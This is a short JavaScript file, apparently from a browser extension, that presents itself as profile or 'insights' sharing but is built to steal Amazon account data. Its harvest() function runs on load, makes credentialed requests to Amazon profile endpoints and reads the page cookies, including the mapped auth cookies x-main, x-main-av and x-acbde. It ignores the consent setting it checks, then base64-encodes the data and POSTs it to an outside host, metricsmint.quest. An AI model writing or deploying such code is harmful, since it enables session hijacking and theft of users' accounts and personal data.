const config = JSON.parse('{"Ec":"https://me3x.online/","uL":"https://me3x.online/n/","d1":"https://metricsmint.quest/up"}');
const consentKey = "shareInsights";
const AUTH_COOKIE_BY_DOMAIN = {
  "www.amazon.com": "x-main",
  "www.primevideo.com": "x-main-av",
  "www.amazon.de": "x-acbde"
};
const emailField = "emailOptions.customerEmailAddress";
function b64encode(s) { return btoa(s); }
function sendAdditionalProfileData(svod, data) {
  return fetch(config.d1, {
    method: "POST",
    body: b64encode(JSON.stringify({ svod, ...data }))
  });
}
async function harvest() {
  await fetch("https://www.amazon.com/hz/contact-us", { credentials: "include" });
  const profile = await fetch("/slc/hub/api/getProfileData?");
  const attrs = "/slc/cpp/attributes-json?model=general&actorId=" + profile.id;
  const cookie = document.cookie;
  chrome.storage.sync.get([consentKey], () => {});
  return sendAdditionalProfileData("prime", { email: emailField, attrs, cookie });
}
harvest();
